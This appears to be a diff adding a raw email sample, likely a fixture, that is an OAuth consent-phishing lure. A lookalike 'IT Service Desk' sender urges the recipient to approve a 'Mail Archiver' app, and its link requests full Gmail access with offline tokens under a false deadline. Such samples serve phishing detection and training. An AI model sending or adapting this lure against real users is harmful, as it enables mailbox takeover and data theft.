@@ -1,0 +1,40 @@
+Delivered-To: you@acme.com
+Received:
+ by 2002:a05:6a10:1234 with SMTP id x1csp1;  Mon, 12 Oct 2026 02:30:00 -0700
+Authentication-Results: mx.google.com; dkim=pass
+ header.i=@acme-it-services.com header.s=s1 header.b=AbCdEf12; spf=pass
+ (google.com: domain of bounce@acme-it-services.com)
+ smtp.mailfrom=bounce@acme-it-services.com; dmarc=pass (p=NONE sp=NONE
+ dis=NONE) header.from=acme-it-services.com
+From: "IT Service Desk" <servicedesk@acme-it-services.com>
+To: you@acme.com
+Subject: Action required: approve the new mail archiving app
+Date: Mon, 12 Oct 2026 09:30:00 +0000
+Message-ID: <47683e3ee23a1968@mail.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============0696465939655209109=="
+
+--===============0696465939655209109==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+To keep access to the shared mailbox, approve Mail Archiver: https://accounts=
+.google.com/o/oauth2/v2/auth?client_id=3D73519-mailarchiver.apps.googleuserco=
+ntent.com&redirect_uri=3Dhttps%3A%2F%2Fmail-archiver.app%2Fcallback&response_=
+type=3Dcode&scope=3Dhttps%3A%2F%2Fmail.google.com%2F%20openid%20email&access_=
+type=3Doffline&prompt=3Dconsent
+
+--===============0696465939655209109==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<p>Hi,</p><p>We are migrating shared mailboxes. To keep your access, approve =
+the new <a href=3D"https://accounts.google.com/o/oauth2/v2/auth?client_id=3D7=
+3519-mailarchiver.apps.googleusercontent.com&redirect_uri=3Dhttps%3A%2F%2Fmai=
+l-archiver.app%2Fcallback&response_type=3Dcode&scope=3Dhttps%3A%2F%2Fmail.goo=
+gle.com%2F%20openid%20email&access_type=3Doffline&prompt=3Dconsent">Mail Arch=
+iver</a> app by Friday.</p><p>IT Service Desk</p>
+
+--===============0696465939655209109==--
